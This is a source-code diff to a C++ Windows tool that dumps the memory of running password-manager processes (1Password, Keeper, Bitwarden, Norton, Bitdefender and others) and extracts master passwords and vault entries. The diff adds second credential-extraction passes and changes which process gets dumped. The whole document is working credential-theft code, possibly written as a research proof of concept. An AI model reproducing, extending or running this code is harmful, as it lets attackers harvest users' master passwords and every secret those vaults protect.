@@ -17,6 +17,7 @@
 #include "headers/1password/app/getProcUAC1password.h"
 #include "headers/1password/app/FindsecondPID1password.h"
 #include "headers/1password/plugin/getCreds1passwordplugin.h"
+#include "headers/1password/plugin/getCreds1passwordplugin2.h"
 #include "headers/keeper/getCredskeeper1.h"
 #include "headers/keeper/getCredskeeper2.h"
 #include "headers/dashlane/getCredsdashlaneEntries.h"
@@ -28,7 +29,9 @@
 #include "headers/bitwarden/plugin/getCredsbitwardenPluginChrome.h"
 #include "headers/bitwarden/plugin/getCredsbitwardenPluginChrome2.h"
 #include "headers/norton/getCredsnorton.h"
+#include "headers/norton/getCredsnorton2.h"
 #include "headers/bitdefender/getCredsbitdefender.h"
+#include "headers/bitdefender/getCredsbitdefender2.h"
 #include "headers/ironvest/getCredsironvest.h"
 #include "headers/passwarden/app/getCredspasswarden.h"
 #include "headers/avira/getCredsavira.h"
@@ -360,7 +363,7 @@ int main() {
         if (userInput == "1password" && userInput2 == "0") {
             std::cout << "User input matches '1Password' browser plugin.\n";
             std::cout << "1Password browser plugin only contains master password and the account email (username) of the user.\n";
-            std::cout << "Regardless of the browser, the 2nd largest in size process must be found.\n";
+            std::cout << "Regardless of the browser, the largest in size process must be found.\n";
             std::cout << "Provide the browser (e.g., firefox, chrome): ";
             std::string browserInput;
             std::cin >> browserInput;
@@ -376,17 +379,17 @@ int main() {
                     // Step 2: Get Private Working Set sizes for the found PIDs
                     std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
 
-                    // Step 3: Find the PID with the second-largest Private Working Set size
-                    DWORD secondLargestPID = FindSecondPID(pidSizePairs);
+                    // Step 3: Find the PID with the first-largest Private Working Set size
+                    DWORD firstLargestPID = FindFirstPID(pidSizePairs);
 
-                    if (secondLargestPID != 0)
+                    if (firstLargestPID != 0)
                     {
-                        // Step 4: Create a dump file for the process with the second-largest size
-                        saveDump(secondLargestPID);
+                        // Step 4: Create a dump file for the process with the first-largest size
+                        saveDump(firstLargestPID);
                     }
                     else
                     {
-                        std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
+                        std::cerr << "No process with the first-largest Private Working Set size found." << std::endl;
                     }
                 }
                 else
@@ -410,25 +413,28 @@ int main() {
                     // Step 2: Get Private Working Set sizes for the found PIDs
                     std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
 
-                    // Step 3: Find the PID with the second-largest Private Working Set size
-                    DWORD secondLargestPID = FindSecondPID(pidSizePairs);
+                    // Step 3: Find the PID with the first-largest Private Working Set size
+                    DWORD firstLargestPID = FindFirstPID(pidSizePairs);
 
-                    if (secondLargestPID != 0)
+                    if (firstLargestPID != 0)
                     {
-                        // Step 4: Create a dump file for the process with the second-largest size
-                        saveDump(secondLargestPID);
+                        // Step 4: Create a dump file for the process with the first-largest size
+                        saveDump(firstLargestPID);
                     }
                     else
                     {
-                        std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
+                        std::cerr << "No process with the first-largest Private Working Set size found." << std::endl;
                     }
                 }
                 else
                 {
                     std::cerr << "No processes with the specified name found." << std::endl;
                 }
-                std::cout << "Searching for master credentials.\n";
+                std::cout << "Searching for master credentials (1/2).\n";
                 getCreds1passwordplugin();
+                std::cout << "Done!\n";
+                std::cout << "Searching for master credentials (2/2).\n";
+                getCreds1passwordplugin2();
                 std::cout << "Done!\n";
                 std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
             }
@@ -668,8 +674,37 @@ int main() {
             std::cerr << "No processes with the specified name found." << std::endl;
         }
 
-        std::cout << "Searching for entries.\n";
+        std::cout << "Searching for entries (1/2).\n";
         getCredsnorton();
+        std::cout << "Done!\n";
+
+        // Step 1: Find PIDs by process name
+        std::vector<DWORD> pids = FindPIDsByProcessName(processName);
+
+        if (!pids.empty())
+        {
+            // Step 2: Get Private Working Set sizes for the found PIDs
+            std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
+
+            // Step 3: Find the PID with the second-largest Private Working Set size
+            DWORD secondLargestPID = FindSecondPID(pidSizePairs);
+
+            if (secondLargestPID != 0)
+            {
+                // Step 4: Create a dump file for the process with the second-largest size
+                saveDump(secondLargestPID);
+            }
+            else
+            {
+                std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
+            }
+        }
+        else
+        {
+            std::cerr << "No processes with the specified name found." << std::endl;
+        }
+        std::cout << "Searching for passwords (master and entries 2/2).\n";
+        getCredsnorton2();
         std::cout << "Done!\n";
         std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
     }
@@ -713,8 +748,11 @@ int main() {
             std::cerr << "No processes with the specified name found." << std::endl;
         }
 
-        std::cout << "Searching for master pass.\n";
+        std::cout << "Searching for master pass (1/2).\n";
         getCredsbitdefender();
+        std::cout << "Done!\n";
+        std::cout << "Searching for master pass (1/2).\n";
+        getCredsbitdefender2();
         std::cout << "Done!\n";
         std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
     }
